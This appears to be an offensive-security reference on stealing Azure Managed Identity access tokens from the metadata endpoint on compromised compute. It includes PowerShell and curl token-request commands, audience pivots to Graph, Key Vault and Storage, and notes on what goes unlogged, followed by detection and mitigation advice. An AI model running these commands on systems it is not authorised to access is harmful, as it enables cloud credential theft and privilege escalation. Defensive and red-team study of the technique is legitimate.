## Overview

Every Azure compute resource — VM, VMSS, AKS node, App Service, Azure Functions, Container Instance — that has a Managed Identity assigned can request OAuth access tokens through the Instance Metadata Service (IMDS). The IMDS endpoint is a non-routable address (`169.254.169.254`) accessible only from within the compute resource. No credentials, secrets, certificates, or client configuration are required. The platform authenticates the request based on the compute resource's identity.

From an attacker's perspective: any code execution on Azure compute translates directly to token acquisition for the assigned Managed Identity. The identity's permissions determine the blast radius.

## How IMDS Token Acquisition Works

The MI token flow bypasses all standard OAuth credential requirements:

```
Code execution inside Azure compute (VM, container, function, app)
     ↓
HTTP GET to 169.254.169.254/metadata/identity/oauth2/token
  ?api-version=2018-02-01
  &resource=<TARGET_RESOURCE_URI>
  Header: Metadata: true
     ↓
Azure fabric authenticates the compute resource's identity
     ↓
Returns access_token for the specified resource
     ↓
Use token as Bearer against target API
```

The token audience (`resource` parameter) determines which Azure service the token is valid for.

## Acquiring a Token from IMDS

**System-assigned managed identity:**
```powershell
# PowerShell — inside compromised Azure compute
$response = Invoke-RestMethod `
    -Method GET `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" `
    -Headers @{ Metadata = "true" }

$ARMToken = $response.access_token
Write-Host "Token expires: $(([System.DateTimeOffset]::FromUnixTimeSeconds($response.expires_on)).UtcDateTime)"
```

```bash
# bash — inside compromised Linux compute
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool
```

**User-assigned managed identity** (specify which MI via `client_id`):
```powershell
$clientId = "<USER_ASSIGNED_MI_CLIENT_ID>"
$response  = Invoke-RestMethod `
    -Method GET `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$clientId" `
    -Headers @{ Metadata = "true" }
```

If a compute resource has multiple user-assigned identities, `client_id` is required to disambiguate. Without it, the request fails with an ambiguity error that reveals the presence of multiple identities.

## Resource Audience Pivot

The same IMDS endpoint issues tokens for any Azure resource — change the `resource` parameter:

| Resource | URI |
|---|---|
| Azure Resource Manager | `https://management.azure.com/` |
| Microsoft Graph | `https://graph.microsoft.com/` |
| Azure Key Vault | `https://vault.azure.net` |
| Azure Storage | `https://storage.azure.com/` |
| Log Analytics / Defender | `https://api.loganalytics.io/` |

Each requires a separate token request. Request all relevant audiences in sequence to understand the full MI attack surface.

## Identifying the MI Object ID

The `object_id` field in the IMDS response is the MI's principal ID in Entra ID — used to enumerate RBAC assignments and permissions:

```powershell
$response = Invoke-RestMethod `
    -Method GET `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" `
    -Headers @{ Metadata = "true" }

$miObjectId  = $response.client_id    # Client ID of the MI
$miPrincipal = $response.object_id    # Object ID in Entra ID (for RBAC lookups)

Write-Host "MI Client ID:  $miObjectId"
Write-Host "MI Object ID:  $miPrincipal"
```

The object ID links directly to the RBAC enumeration technique — see **Managed Identity — Privilege Mapping and Abuse**.

## Azure Compute Types with IMDS Access

| Compute type | MI support | Token path |
|---|---|---|
| Azure VM (Windows/Linux) | ✓ | Standard IMDS |
| Virtual Machine Scale Sets | ✓ | Standard IMDS |
| AKS node pool | ✓ | Standard IMDS (or workload identity) |
| App Service / Functions | ✓ | IMDS or `IDENTITY_ENDPOINT` env var |
| Container Instances | ✓ | Standard IMDS |
| Azure Container Apps | ✓ | Standard IMDS |

On App Service and Functions, an alternative token endpoint may be available via the `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` environment variables — check both if IMDS is unreachable.

## Operator Notes

- IMDS is accessible without authentication, without credentials, and without special privileges — any code running inside the compute resource can call it, including web shells, scripts in compromised pipelines, and injected workloads.
- There is no logging of IMDS calls within Azure. Token issuance through IMDS does not appear in Entra ID sign-in logs. Usage of the resulting token against Azure APIs does generate logs at those APIs.
- The MI token has the same lifetime as any other Azure AD token (~1 hour). Refreshing requires another IMDS call — trivial from within the compute resource.
- If IMDS is unreachable, the compute resource may not have a MI assigned, or network controls are blocking access to the metadata endpoint. An error containing "no managed identity endpoint found" or a connection timeout confirms the absence of MI.

## Detection / Friction Points

- **Token issuance via IMDS is not logged** — there is no Entra ID sign-in event for IMDS token requests. Detection relies on API usage downstream.
- Downstream API calls using the MI token appear in ARM Activity Logs, Key Vault diagnostic logs, and Storage diagnostic logs attributed to the MI's principal name (not a user identity).
- Unusual ARM or Graph operations attributed to a service principal with a name matching the compute resource (e.g., `vm-name/managed-identity`) are a detection signal.
- Microsoft Defender for Cloud can flag anomalous IMDS usage patterns and unusual MI permission usage.
- Mitigation: assign least-privilege RBAC to MIs; regularly audit MI permission assignments; use user-assigned identities for easier permission management and revocation.
